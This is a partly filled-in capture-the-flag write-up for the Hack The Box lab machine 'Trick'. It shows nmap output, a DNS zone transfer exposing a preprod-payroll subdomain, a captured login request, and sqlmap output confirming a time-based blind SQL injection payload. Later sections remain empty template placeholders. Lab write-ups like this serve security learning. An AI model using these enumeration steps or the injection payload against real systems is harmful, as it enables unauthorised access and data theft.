
| Property         | Value                         |
| ---------------- | ----------------------------- |
| **OS**           | Linux / Windows               |
| **Difficulty**   | Easy / Medium / Hard / Insane |
| **Release Date** | YYYY-MM-DD                    |
| **State**        | YYYY-MM-DD                    |
| **IP**           | 10.10.10.X                    |
| **Techniques**   | technique-1, technique-2      |
| **Tags**         | #web #privesc #linux          |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
nmap -sC -sV trick.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-15 17:04 EDT
Nmap scan report for trick.htb (10.129.227.180)
Host is up (0.029s latency).
Not shown: 996 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 247.77 seconds
                                                                                            
```

### DNS Zone Transfer

```
dig AXFR @trick.htb trick.htb                           

; <<>> DiG 9.20.15-2-Debian <<>> AXFR @trick.htb trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 48 msec
;; SERVER: 10.129.227.180#53(trick.htb) (TCP)
;; WHEN: Wed Sep 16 07:59:42 EDT 2026
;; XFR size: 6 records (messages 1, bytes 231)

```

img 1

---
## SQL injection

How you gained initial access to the machine.

### Vulnerability

Description of the vulnerability exploited.

### Exploitation

Capturing the login request with burpsuite:

```shell
POST /ajax.php?action=login HTTP/1.1
Host: preprod-payroll.trick.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 27
Origin: http://preprod-payroll.trick.htb
Connection: keep-alive
Referer: http://preprod-payroll.trick.htb/login.php
Cookie: PHPSESSID=pnaaf157pig45llsg0ft7hdrip
Priority: u=0

username=test&password=test

```

```
sqlmap -r req.txt --batch 
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[,]_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
|_ -| . [)]     | .'| . |                                                                                                                                                                                                                   
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:41:32 /2026-09-16/

[08:41:32] [INFO] parsing HTTP request from 'req.txt'
[08:41:32] [INFO] testing connection to the target URL
[08:41:32] [INFO] testing if the target URL content is stable
[08:41:33] [INFO] target URL content is stable
[08:41:33] [INFO] testing if POST parameter 'username' is dynamic
[08:41:33] [WARNING] POST parameter 'username' does not appear to be dynamic
[08:41:33] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[08:41:33] [INFO] testing for SQL injection on POST parameter 'username'
[08:41:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:41:34] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[08:41:34] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[08:41:34] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[08:41:35] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[08:41:35] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[08:41:35] [INFO] testing 'Generic inline queries'
[08:41:35] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[08:41:36] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[08:41:36] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[08:41:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[08:41:46] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[08:41:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[08:41:46] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[08:41:46] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[08:41:47] [INFO] target URL appears to have 8 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[08:41:51] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[08:41:52] [INFO] target URL appears to be UNION injectable with 8 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[08:41:56] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 210 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 3523 FROM (SELECT(SLEEP(5)))EHpf) AND 'iEAW'='iEAW&password=test
---
[08:42:12] [INFO] the back-end DBMS is MySQL
[08:42:12] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[08:42:17] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
[08:42:17] [WARNING] your sqlmap version is outdated

[*] ending @ 08:42:17 /2026-09-16/

```

### Database Enumeration



---
## User Flag

### Lateral Movement (if applicable)

Steps to move from initial foothold to user access.

---
## Privilege Escalation

### Enumeration

What you found that leads to root/admin.

### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)